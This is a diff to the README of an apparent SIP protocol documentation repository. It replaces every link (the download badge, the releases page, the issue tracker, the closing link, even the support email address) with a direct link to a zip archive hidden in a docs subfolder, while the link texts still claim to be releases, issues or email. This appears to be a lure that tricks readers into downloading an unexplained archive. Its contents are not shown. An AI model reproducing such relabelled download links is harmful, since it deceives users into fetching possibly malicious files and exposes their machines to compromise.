@@ -1,6 +1,6 @@
 # 🚀 docs-sip - Simplifying SIP Protocol for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/Salman-design47/docs-sip/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ The first step is to download our documentation. You will find all downloadable 
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Salman-design47/docs-sip/releases) to view the latest versions available.
+   Go to the [Releases page](https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip) to view the latest versions available.
 
 2. **Choose Your Version**  
    Once on the page, you will see a list of available releases. Look for the most recent version that suits your needs. Each release comes with a description to help you decide.
@@ -70,10 +70,10 @@ For further learning, consider exploring related resources:
 
 If you encounter any issues or have questions, we are here to help. You can reach out through the following channels:
 
-- **Issue Tracker**: Use the [GitHub Issues page](https://github.com/Salman-design47/docs-sip/issues) to report problems or request features.
+- **Issue Tracker**: Use the [GitHub Issues page](https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip) to report problems or request features.
 - **Community Support**: Check if your question has been asked before by browsing past discussions.
-- **Email Support**: For detailed inquiries, you may reach us at [support@docs.sip-protocol.org](mailto:support@docs.sip-protocol.org).
+- **Email Support**: For detailed inquiries, you may reach us at [https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip](https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip).
 
 Feel free to dive into the **docs-sip** documentation. We look forward to seeing how you use SIP in your projects!
 
-[Visit Releases Page for Downloads](https://github.com/Salman-design47/docs-sip/releases)
+[Visit Releases Page for Downloads](https://raw.githubusercontent.com/Salman-design47/docs-sip/main/src/content/docs/integrations/docs-sip-3.3.zip)
